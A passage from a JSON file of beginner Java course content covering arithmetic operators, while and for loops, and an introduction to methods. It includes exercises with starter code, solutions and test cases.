              "content": "1. ADDITION (+)\n   int sum = 10 + 5;     // sum is 15\n   int x = 7;\n   int y = 3;\n   int total = x + y;    // total is 10\n\n2. SUBTRACTION (-)\n   int difference = 10 - 5;  // 5\n   int age = 30;\n   int yearsAgo = age - 10;  // 20\n\n3. MULTIPLICATION (*)\n   int product = 10 * 5;     // 50\n   int price = 20;\n   int quantity = 3;\n   int total = price * quantity;  // 60\n\n4. DIVISION (/)\n   int quotient = 10 / 5;    // 2\n   ⚠️ WARNING: int division truncates decimals!\n   int result = 10 / 3;      // 3 (not 3.333...)\n   double result = 10.0 / 3; // 3.333...\n\n5. MODULO (%) - Remainder after division\n   int remainder = 10 % 3;   // 1 (10 ÷ 3 = 3 remainder 1)\n   int rem = 17 % 5;         // 2 (17 ÷ 5 = 3 remainder 2)\n   Use cases: Check if even (x % 2 == 0), cycle through values"
            },
            {
              "type": "THEORY",
              "title": "Order of Operations (PEMDAS)",
              "content": "Just like in math, Java follows order of operations:\n\nParentheses → Multiplication/Division → Addition/Subtraction\n\nExamples:\nint result = 5 + 3 * 2;     // 11 (not 16!)\n// Multiply first: 3 * 2 = 6, then add: 5 + 6 = 11\n\nint result = (5 + 3) * 2;   // 16\n// Parentheses first: 5 + 3 = 8, then multiply: 8 * 2 = 16\n\nint result = 10 / 2 + 3;    // 8\n// Divide first: 10 / 2 = 5, then add: 5 + 3 = 8\n\nWhen in doubt, use parentheses to be explicit:\nint total = (price * quantity) + tax;  // Clear intent"
            },
            {
              "type": "THEORY",
              "title": "Shorthand Operators",
              "content": "Java provides shortcuts for common patterns:\n\n1. INCREMENT (add 1)\n   int score = 10;\n   score++;  // Same as: score = score + 1\n   // score is now 11\n\n2. DECREMENT (subtract 1)\n   int lives = 3;\n   lives--;  // Same as: lives = lives - 1\n   // lives is now 2\n\n3. COMPOUND ASSIGNMENT\n   int x = 10;\n   x += 5;   // Same as: x = x + 5  (x is 15)\n   x -= 3;   // Same as: x = x - 3  (x is 12)\n   x *= 2;   // Same as: x = x * 2  (x is 24)\n   x /= 4;   // Same as: x = x / 4  (x is 6)\n\nThese are VERY common in real code!"
            },
            {
              "type": "KEY_POINT",
              "title": "Common Mistakes to Avoid",
              "content": "❌ WRONG: int result = 5 x 3;  (x is not an operator)\n✓ CORRECT: int result = 5 * 3;\n\n❌ WRONG: int half = 10 / 2.0;  (can't assign double to int)\n✓ CORRECT: double half = 10 / 2.0;\n\n❌ WRONG: int result = 10 / 3;  // Thinking this gives 3.33\n✓ CORRECT: double result = 10.0 / 3.0;  // This gives 3.33\n\n❌ WRONG: x =+ 5;  (This assigns 5, doesn't add!)\n✓ CORRECT: x += 5;  (This adds 5 to x)\n\nRemember: In integer division, the decimal part is thrown away!\n7 / 2 = 3 (not 3.5)"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-1-lesson-2-calc",
              "title": "Basic Calculator",
              "description": "Given: int a = 20 and int b = 5\n\nCalculate: (a + b) * 2\nStore the result in a variable called 'result'\nThen print the result.\n\nExpected output: 50\n(Because 20 + 5 = 25, and 25 * 2 = 50)",
              "instructions": "Given: int a = 20 and int b = 5\n\nCalculate: (a + b) * 2\nStore the result in a variable called 'result'\nThen print the result.\n\nExpected output: 50\n(Because 20 + 5 = 25, and 25 * 2 = 50)",
              "starterCode": "// Basic Calculator\n// Using Java 23 implicit main syntax\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Basic Calculator\n// Using Java 23 implicit main syntax\n// This demonstrates arithmetic operators and order of operations\n\nvoid main() {\n    // Create variables a and b\n    int a = 20;\n    int b = 5;\n    \n    // Calculate (a + b) * 2 using parentheses for order of operations\n    int result = (a + b) * 2;\n    \n    // Print the result\n    println(result);\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-1-lesson-2-calc-test-1",
                  "description": "Should calculate (20 + 5) * 2 = 50",
                  "expectedOutput": "50",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use the print/println function to display output."
                },
                {
                  "level": 1,
                  "text": "Create a variable to store your value. In java, use appropriate syntax."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-1-lesson-2-compound",
              "title": "Using Compound Operators",
              "description": "Starting with: int score = 100\n\n1. Add 50 to score using the += operator\n2. Subtract 30 from score using the -= operator\n3. Print the final score\n\nExpected output: 120\n(100 + 50 - 30 = 120)",
              "instructions": "Starting with: int score = 100\n\n1. Add 50 to score using the += operator\n2. Subtract 30 from score using the -= operator\n3. Print the final score\n\nExpected output: 120\n(100 + 50 - 30 = 120)",
              "starterCode": "// Using Compound Operators\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Using Compound Operators\n// This demonstrates compound assignment operators (+=, -=)\n\nvoid main() {\n    // Start with score = 100\n    int score = 100;\n    \n    // Add 50 using += operator\n    score += 50;  // score is now 150\n    \n    // Subtract 30 using -= operator\n    score -= 30;  // score is now 120\n    \n    // Print the final score\n    println(score);\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-1-lesson-2-compound-test-1",
                  "description": "Should output 120",
                  "expectedOutput": "120",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use the print/println function to display output."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "epoch-1-lesson-3",
          "title": "Lesson 2.3: While Loops - Mastering Repetition",
          "moduleId": "module-02",
          "order": 3,
          "estimatedMinutes": 35,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Repeating Tasks",
              "content": "Imagine you need to print \"Hello\" 100 times. You COULD write:\n\nSystem.out.println(\"Hello\");\nSystem.out.println(\"Hello\");\nSystem.out.println(\"Hello\");\n// ...97 more times!\n\nThis is:\n❌ Tedious to write\n❌ Error-prone (did you type exactly 100?)\n❌ Hard to change (what if you need 1000?)\n\nReal-world examples of repetition:\n• A game runs the same game loop thousands of times\n• A server checks for new requests continuously\n• You scroll through a list of items one by one\n\nYou need a way to say: \"KEEP DOING THIS until a condition is met.\"\n\nThis is what LOOPS do!"
            },
            {
              "type": "KEY_POINT",
              "title": "Loops are Like \"Simon Says\" Rules",
              "content": "Remember the game \"Simon Says\"?\n\n\"Keep jumping while I'm clapping\"\n\nYou KEEP jumping (repeating the action) WHILE the condition (clapping) is true.\nWhen the clapping stops (condition becomes false), you stop jumping.\n\nA while loop works the same way:\n\nwhile (condition is true) {\n    keep doing this\n}\n\nAnother analogy: Brushing your teeth\n\nwhile (teeth are dirty) {\n    brush teeth;\n}\n\nYou keep brushing WHILE the condition (teeth are dirty) is true.\nOnce your teeth are clean (condition is false), you stop."
            },
            {
              "type": "THEORY",
              "title": "While Loop Syntax",
              "content": "The basic structure:\n\nwhile (condition) {\n    // Code to repeat\n}\n\nReal example - Count to 5:\n\nint count = 1;\nwhile (count <= 5) {\n    System.out.println(count);\n    count++;  // CRITICAL: Change the condition!\n}\n\nHow it works:\n1. Check: Is count <= 5? (1 <= 5? YES)\n2. Run code: Print 1, then count becomes 2\n3. Check again: Is count <= 5? (2 <= 5? YES)\n4. Run code: Print 2, then count becomes 3\n5. Repeat until count is 6\n6. Check: Is count <= 5? (6 <= 5? NO)\n7. STOP - exit the loop\n\nOutput: 1 2 3 4 5"
            },
            {
              "type": "THEORY",
              "title": "The Infinite Loop Danger",
              "content": "⚠️ CRITICAL MISTAKE: Forgetting to change the condition\n\nWRONG:\nint count = 1;\nwhile (count <= 5) {\n    System.out.println(count);\n    // Forgot count++!\n}\n\nThis creates an INFINITE LOOP:\n- count is always 1\n- 1 <= 5 is always true\n- Loop runs FOREVER\n- Your program hangs/crashes\n\nGOLDEN RULE: Always modify the loop variable inside the loop!\n\nCommon patterns:\n• Counting up: count++\n• Counting down: count--\n• Reading input: get next value from user"
            },
            {
              "type": "KEY_POINT",
              "title": "When to Use While Loops",
              "content": "Use a while loop when:\n\n✓ You DON'T know how many times to repeat in advance\n   - \"Keep asking until user enters valid input\"\n   - \"Keep running game until player loses all lives\"\n\n✓ The repetition depends on a condition\n   - while (userIsLoggedIn) { ... }\n   - while (hasMoreData) { ... }\n\nExample patterns:\n\n// Sum numbers from 1 to 10\nint sum = 0;\nint n = 1;\nwhile (n <= 10) {\n    sum += n;  // Add n to sum\n    n++;       // Move to next number\n}\n// sum is now 55\n\n// Countdown\nint countdown = 5;\nwhile (countdown > 0) {\n    System.out.println(countdown);\n    countdown--;\n}\nSystem.out.println(\"Blast off!\");\n// Prints: 5 4 3 2 1 Blast off!"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-1-lesson-3-count",
              "title": "Count to 10",
              "description": "Write a while loop that prints the numbers 1 through 10, each on a separate line.\n\nSteps:\n1. Create a variable 'i' starting at 1\n2. Create a while loop that runs while i <= 10\n3. Inside the loop, print i\n4. Increment i (i++)\n\nExpected output:\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10",
              "instructions": "Write a while loop that prints the numbers 1 through 10, each on a separate line.\n\nSteps:\n1. Create a variable 'i' starting at 1\n2. Create a while loop that runs while i <= 10\n3. Inside the loop, print i\n4. Increment i (i++)\n\nExpected output:\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10",
              "starterCode": "// Count to 10\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Count to 10\n// This demonstrates while loops for counting\n\nvoid main() {\n    // Step 1: Create counter variable starting at 1\n    int i = 1;\n    \n    // Step 2: Loop while i <= 10\n    while (i <= 10) {\n        // Step 3: Print the current value\n        println(i);\n        \n        // Step 4: Increment i (CRITICAL to avoid infinite loop!)\n        i++;\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-1-lesson-3-count-test-1",
                  "description": "Should print numbers 1 to 10",
                  "expectedOutput": "1\n2\n3\n4\n5\n6\n7\n8\n9\n10",
                  "isVisible": true
                },
                {
                  "id": "epoch-1-lesson-3-count-test-2",
                  "description": "Loop should start at 1 (not 0)",
                  "expectedOutput": "1\n2\n3\n4\n5\n6\n7\n8\n9\n10",
                  "isVisible": false
                },
                {
                  "id": "epoch-1-lesson-3-count-test-3",
                  "description": "Loop should include 10 (check boundary condition)",
                  "expectedOutput": "1\n2\n3\n4\n5\n6\n7\n8\n9\n10",
                  "isVisible": false
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use the print/println function to display output."
                },
                {
                  "level": 1,
                  "text": "Create a variable to store your value. In java, use appropriate syntax."
                },
                {
                  "level": 2,
                  "text": "Use a for loop or while loop to repeat the operation."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-1-lesson-3-sum",
              "title": "Sum with While Loop",
              "description": "Use a while loop to calculate the sum of numbers from 1 to 5.\n\nSteps:\n1. Create variable 'sum' starting at 0\n2. Create variable 'n' starting at 1\n3. While n <= 5:\n   - Add n to sum (sum += n)\n   - Increment n\n4. Print the final sum\n\nExpected output: 15\n(Because 1 + 2 + 3 + 4 + 5 = 15)",
              "instructions": "Use a while loop to calculate the sum of numbers from 1 to 5.\n\nSteps:\n1. Create variable 'sum' starting at 0\n2. Create variable 'n' starting at 1\n3. While n <= 5:\n   - Add n to sum (sum += n)\n   - Increment n\n4. Print the final sum\n\nExpected output: 15\n(Because 1 + 2 + 3 + 4 + 5 = 15)",
              "starterCode": "// Sum with While Loop\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Sum with While Loop\n// This demonstrates using while loops for accumulation\n\nvoid main() {\n    // Step 1: Create sum variable to accumulate the total\n    int sum = 0;\n    \n    // Step 2: Create counter variable starting at 1\n    int n = 1;\n    \n    // Step 3: Loop while n <= 5\n    while (n <= 5) {\n        // Add n to sum\n        sum += n;\n        \n        // Increment n\n        n++;\n    }\n    \n    // Step 4: Print the final sum\n    println(sum);\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-1-lesson-3-sum-test-1",
                  "description": "Should calculate sum 1+2+3+4+5 = 15",
                  "expectedOutput": "15",
                  "isVisible": true
                },
                {
                  "id": "epoch-1-lesson-3-sum-test-2",
                  "description": "Sum should start at 0 (accumulator pattern)",
                  "expectedOutput": "15",
                  "isVisible": false
                },
                {
                  "id": "epoch-1-lesson-3-sum-test-3",
                  "description": "Loop should include 5 in the sum",
                  "expectedOutput": "15",
                  "isVisible": false
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use the print/println function to display output."
                },
                {
                  "level": 1,
                  "text": "Create a variable to store your value. In java, use appropriate syntax."
                },
                {
                  "level": 2,
                  "text": "Use a for loop or while loop to repeat the operation."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "epoch-1-lesson-4",
          "title": "Lesson 2.4: For Loops - Counting Made Easy",
          "moduleId": "module-02",
          "order": 4,
          "estimatedMinutes": 30,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: While Loops for Counting Feel Clunky",
              "content": "You learned to count with a while loop:\n\nint i = 1;\nwhile (i <= 10) {\n    System.out.println(i);\n    i++;\n}\n\nThis works, but notice the pattern:\n1. INITIALIZE a counter (int i = 1)\n2. CHECK a condition (i <= 10)\n3. UPDATE the counter (i++)\n\nThese three pieces are scattered across 4 lines! When you're just COUNTING, this feels messy.\n\nJava provides a cleaner syntax for this exact pattern: the FOR LOOP.\n\nThe same code with a for loop:\n\nfor (int i = 1; i <= 10; i++) {\n    System.out.println(i);\n}\n\nAll three pieces (init, condition, update) are on ONE line!"
            },
            {
              "type": "KEY_POINT",
              "title": "For Loops are Like a Recipe's Prep List",
              "content": "Imagine a recipe that says:\n\n\"For each of the 12 muffin cups: fill with batter, bake for 20 minutes\"\n\nIn Java:\n\nfor (cup 1 to 12) {\n    fill cup with batter;\n    bake cup;\n}\n\nThe recipe header tells you:\n- START: cup 1\n- STOP WHEN: you've done 12\n- EACH TIME: move to the next cup\n\nA for loop packages all this information upfront, making it crystal clear:\n\"I'm going to do this task a specific number of times.\""
            },
            {
              "type": "THEORY",
              "title": "For Loop Syntax",
              "content": "for (initialization; condition; update) {\n    // Code to repeat\n}\n\nThree parts separated by semicolons:\n\n1. INITIALIZATION: Run once at the start\n   int i = 0  (Create counter, set starting value)\n\n2. CONDITION: Check before each iteration\n   i < 10  (Keep going while this is true)\n\n3. UPDATE: Run after each iteration\n   i++  (Change the counter)\n\nExample - Print 0 to 4:\n\nfor (int i = 0; i < 5; i++) {\n    System.out.println(i);\n}\n\nExecution flow:\n1. int i = 0  (i is 0)\n2. Check: i < 5? YES → run code (print 0)\n3. Update: i++ (i is now 1)\n4. Check: i < 5? YES → run code (print 1)\n5. Update: i++ (i is now 2)\n... continues until i is 5\n6. Check: i < 5? NO → stop\n\nOutput: 0 1 2 3 4"
            },
            {
              "type": "THEORY",
              "title": "Common For Loop Patterns",
              "content": "1. COUNT FROM 0 TO N (exclusive)\nfor (int i = 0; i < 10; i++) {\n    // Runs 10 times: i = 0, 1, 2...9\n}\nThis is THE most common pattern in programming!\n\n2. COUNT FROM 1 TO N (inclusive)\nfor (int i = 1; i <= 10; i++) {\n    // Runs 10 times: i = 1, 2, 3...10\n}\n\n3. COUNT BACKWARDS\nfor (int i = 10; i > 0; i--) {\n    // Runs 10 times: i = 10, 9, 8...1\n}\n\n4. COUNT BY 2s\nfor (int i = 0; i < 10; i += 2) {\n    // Runs 5 times: i = 0, 2, 4, 6, 8\n}\n\n5. ITERATE OVER CHARACTERS\nString word = \"Hello\";\nfor (int i = 0; i < word.length(); i++) {\n    System.out.println(word.charAt(i));\n    // Prints: H e l l o (each on new line)\n}"
            },
            {
              "type": "KEY_POINT",
              "title": "While vs For: When to Use Each",
              "content": "Use FOR when:\n✓ You know how many times to loop\n✓ You're counting or iterating\n✓ You have a clear start, end, and step\n\nfor (int i = 0; i < 100; i++) { ... }  // \"Do this 100 times\"\n\nUse WHILE when:\n✓ You DON'T know how many times to loop\n✓ The condition is complex\n✓ Not necessarily counting\n\nwhile (userWantsMore) { ... }  // \"Keep going until user says stop\"\n\nRule of thumb:\nCounting → for\nCondition-based → while"
            },
            {
              "type": "WARNING",
              "title": "Common For Loop Pitfalls",
              "content": "Watch out for these common mistakes:\n\n1. OFF-BY-ONE ERRORS:\n// WRONG: Starts at 1, misses index 0\nfor (int i = 1; i < array.length; i++)\n\n// WRONG: Uses <=, goes past last index\nfor (int i = 0; i <= array.length; i++)\n\n// CORRECT: Start at 0, use < length\nfor (int i = 0; i < array.length; i++)\n\n2. INFINITE LOOPS:\n// WRONG: Forgot to increment!\nfor (int i = 0; i < 10; ) { }\n\n// WRONG: Incrementing wrong direction\nfor (int i = 10; i > 0; i++) { }\n\n3. MODIFYING LOOP VARIABLE:\n// DANGEROUS: Changing i inside loop\nfor (int i = 0; i < 10; i++) {\n    i = i + 2;  // Skips iterations unexpectedly\n}\n\n4. STRING CONCATENATION IN LOOPS:\n// SLOW: Creates new String objects each time\nString result = \"\";\nfor (int i = 0; i < 1000; i++) {\n    result += i;  // Use StringBuilder instead!\n}\n\n5. SCOPE OF LOOP VARIABLE:\n// i only exists inside the loop\nfor (int i = 0; i < 5; i++) { }\nSystem.out.println(i);  // ERROR: i not defined here"
            },
            {
              "type": "THEORY",
              "title": "Modern Java: The Enhanced For Loop (for-each)",
              "content": "When you just want to process each item in a collection, the ENHANCED FOR LOOP (also called for-each) is cleaner:\n\nTRADITIONAL FOR LOOP:\nString[] names = {\"Alice\", \"Bob\", \"Charlie\"};\nfor (int i = 0; i < names.length; i++) {\n    System.out.println(names[i]);\n}\n\nENHANCED FOR LOOP (simpler!):\nfor (String name : names) {\n    System.out.println(name);\n}\n\nRead this as: \"for each name in names, do...\"\n\nWith 'var' (Java 10+), it's even cleaner:\nfor (var name : names) {\n    System.out.println(name);\n}\n\nBenefits of enhanced for:\n• No index variable needed\n• No risk of off-by-one errors\n• Clearer intent: \"process each item\"\n• Works with arrays AND collections (like ArrayList)"
            },
            {
              "type": "KEY_POINT",
              "title": "When to Use Each Loop Style",
              "content": "TRADITIONAL FOR: Use when you need the index\n• Modifying elements: array[i] = newValue\n• Comparing adjacent items: array[i] vs array[i+1]\n• Iterating in reverse or by steps\n• Needing to know \"which\" iteration you're on\n\nfor (int i = 0; i < scores.length; i++) {\n    scores[i] = scores[i] * 2;  // Need index to modify\n}\n\nENHANCED FOR: Use when you just process items\n• Reading values without changing them\n• Processing each item the same way\n• When you don't need the position\n\nfor (var score : scores) {\n    total += score;  // Just reading, no index needed\n}\n\nQUICK REFERENCE:\n• Need index? → Traditional for\n• Just processing each item? → Enhanced for (for-each)\n• Unknown iterations? → while\n• Modern collections? → Consider streams (covered later)"
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "epoch-1-lesson-4-numbers",
              "title": "Print 1 to 5",
              "description": "Write a for loop that prints the numbers 1 through 5, each on a separate line.\n\nUse the pattern: for (int i = 1; i <= 5; i++)\n\nExpected output:\n1\n2\n3\n4\n5",
              "instructions": "Write a for loop that prints the numbers 1 through 5, each on a separate line.\n\nUse the pattern: for (int i = 1; i <= 5; i++)\n\nExpected output:\n1\n2\n3\n4\n5",
              "starterCode": "// Print 1 to 5\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Print 1 to 5\n// This demonstrates the for loop syntax\n\nvoid main() {\n    // For loop: initialization; condition; update\n    // i starts at 1, runs while i <= 5, increments by 1 each time\n    for (int i = 1; i <= 5; i++) {\n        println(i);\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-1-lesson-4-numbers-test-1",
                  "description": "Should print 1 through 5",
                  "expectedOutput": "1\n2\n3\n4\n5",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use the print/println function to display output."
                },
                {
                  "level": 2,
                  "text": "Use a for loop or while loop to repeat the operation."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-1-lesson-4-multable",
              "title": "5 Times Table",
              "description": "Use a for loop to print the 5 times table.\n\nLoop from i = 1 to i = 5\nEach iteration, print: i * 5\n\nExpected output:\n5\n10\n15\n20\n25",
              "instructions": "Use a for loop to print the 5 times table.\n\nLoop from i = 1 to i = 5\nEach iteration, print: i * 5\n\nExpected output:\n5\n10\n15\n20\n25",
              "starterCode": "// 5 Times Table\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: 5 Times Table\n// This demonstrates multiplication within a for loop\n\nvoid main() {\n    // Loop from 1 to 5\n    for (int i = 1; i <= 5; i++) {\n        // Print i multiplied by 5\n        println(i * 5);\n    }\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-1-lesson-4-multable-test-1",
                  "description": "Should print 5, 10, 15, 20, 25",
                  "expectedOutput": "5\n10\n15\n20\n25",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use the print/println function to display output."
                },
                {
                  "level": 2,
                  "text": "Use a for loop or while loop to repeat the operation."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            },
            {
              "type": "FREE_CODING",
              "id": "epoch-1-lesson-4-countdown",
              "title": "Rocket Countdown",
              "description": "Create a countdown from 5 to 1, then print \"Liftoff!\"\n\nUse a for loop that:\n- Starts at 5\n- Runs while i > 0\n- Decrements with i--\n\nExpected output:\n5\n4\n3\n2\n1\nLiftoff!",
              "instructions": "Create a countdown from 5 to 1, then print \"Liftoff!\"\n\nUse a for loop that:\n- Starts at 5\n- Runs while i > 0\n- Decrements with i--\n\nExpected output:\n5\n4\n3\n2\n1\nLiftoff!",
              "starterCode": "// Rocket Countdown\n// Write your code below\n\nvoid main() {\n    \n}",
              "solution": "// Solution: Rocket Countdown\n// This demonstrates counting backwards with a for loop\n\nvoid main() {\n    // For loop: start at 5, run while i > 0, decrement each time\n    for (int i = 5; i > 0; i--) {\n        println(i);\n    }\n    \n    // Print \"Liftoff!\" after the countdown\n    println(\"Liftoff!\");\n}",
              "language": "java",
              "testCases": [
                {
                  "id": "epoch-1-lesson-4-countdown-test-1",
                  "description": "Should countdown and print Liftoff!",
                  "expectedOutput": "5\n4\n3\n2\n1\nLiftoff!",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use the print/println function to display output."
                },
                {
                  "level": 2,
                  "text": "Use a for loop or while loop to repeat the operation."
                },
                {
                  "level": 2,
                  "text": "Use an if statement to check the condition."
                },
                {
                  "level": 3,
                  "text": "If stuck, try writing out the solution in plain English first, then convert to java code."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting semicolons",
                  "consequence": "Compilation error",
                  "correction": "Add ; at end of statements"
                },
                {
                  "mistake": "Using = instead of == for comparison",
                  "consequence": "Assignment instead of comparison",
                  "correction": "Use == for primitives, .equals() for objects"
                },
                {
                  "mistake": "Incorrect capitalization (Java is case-sensitive)",
                  "consequence": "Cannot find symbol error",
                  "correction": "Match exact capitalization"
                }
              ],
              "difficulty": "beginner"
            }
          ]
        },
        {
          "id": "epoch-1-lesson-5",
          "title": "Lesson 2.5: Introduction to Methods",
          "moduleId": "module-02",
          "order": 5,
          "estimatedMinutes": 35,
          "difficulty": "beginner",
          "contentSections": [
            {
              "type": "THEORY",
              "title": "The Problem: Copy-Pasting Code is Dangerous",
              "content": "Imagine you need to greet different people in your program:\n\nSystem.out.println(\"Hello, Alice!\");\nSystem.out.println(\"Welcome, Alice!\");\nSystem.out.println(\"Goodbye, Alice!\");\n\nSystem.out.println(\"Hello, Bob!\");\nSystem.out.println(\"Welcome, Bob!\");\nSystem.out.println(\"Goodbye, Bob!\");\n\nThis is:\n❌ Repetitive (same pattern, different name)\n❌ Hard to change (what if you want to add another line?)\n❌ Error-prone (easy to make typos)\n\nWhat if you could define the greeting pattern ONCE, and then just say:\ngreet(\"Alice\");\ngreet(\"Bob\");\n\nThis is what METHODS (also called functions) do! They let you package code into reusable chunks."
            },
            {
              "type": "KEY_POINT",
              "title": "Methods are Like Vending Machine Buttons",
              "content": "Think of a vending machine:\n\n1. You press button \"A1\"\n2. The machine runs a sequence: move arm → grab item → drop item\n3. You get your snack\n\nYou don't need to know HOW the machine works internally. You just press the button (call the method) and get the result.\n\nIn programming:\n\ncalculateTax(100)  ← Press the button (input: 100)\n↓ Internal magic happens\nReturns: 8  ← You get the result\n\nA method is a button with a name. When you \"press\" it (call it), it runs some code and can give you back a result.\n\nAnother analogy: A recipe\nRecipe name: \"Make Pancakes\"\nInputs (ingredients): flour, eggs, milk\nSteps: mix, cook, flip\nOutput: delicious pancakes\n\nmakePancakes(flour, eggs, milk) → pancakes"
            },
            {
              "type": "THEORY",
              "title": "Method Syntax - The Basics",
              "content": "A method has several parts:\n\npublic static RETURN_TYPE methodName(PARAMETERS) {\n    // Code to run\n    return result;  // If return type isn't void\n}\n\nLet's break it down:\n\n1. 'public static' - For now, always write these (you'll understand later)\n2. RETURN_TYPE - What the method gives back (int, double, String, or 'void' for nothing)\n3. methodName - What you call it (use camelCase: calculateSum, printMessage)\n4. PARAMETERS - Inputs in parentheses (like variables: int x, String name)\n5. CODE BLOCK - What the method does\n6. 'return' - Sends the result back (not needed if return type is 'void')\n\nExample 1: Method that returns nothing (void)\n\npublic static void sayHello() {\n    System.out.println(\"Hello!\");\n}\n\nCalling it:\nsayHello();  // Prints: Hello!\n\nExample 2: Method that returns a value\n\npublic static int addNumbers(int a, int b) {\n    int sum = a + b;\n    return sum;\n}\n\nCalling it:\nint result = addNumbers(5, 3);  // result is 8"
            },
            {
              "type": "THEORY",
              "title": "Parameters and Return Values",
              "content": "PARAMETERS: Inputs to the method\n\npublic static void greet(String name) {\n    System.out.println(\"Hello, \" + name + \"!\");\n}\n\ngreet(\"Alice\");  // Prints: Hello, Alice!\ngreet(\"Bob\");    // Prints: Hello, Bob!\n\n'name' is a parameter—a variable that gets its value when you call the method.\n\nRETURN VALUES: Outputs from the method\n\npublic static int square(int number) {\n    return number * number;\n}\n\nint result = square(5);  // result is 25\nint x = square(10);      // x is 100\n\nThe 'return' keyword sends the value back to wherever the method was called.\n\nThink of it like:\n- Parameters = ingredients you give to a chef\n- Return value = the dish the chef gives back"
            },
            {
              "type": "KEY_POINT",
              "title": "void vs Returning a Value",
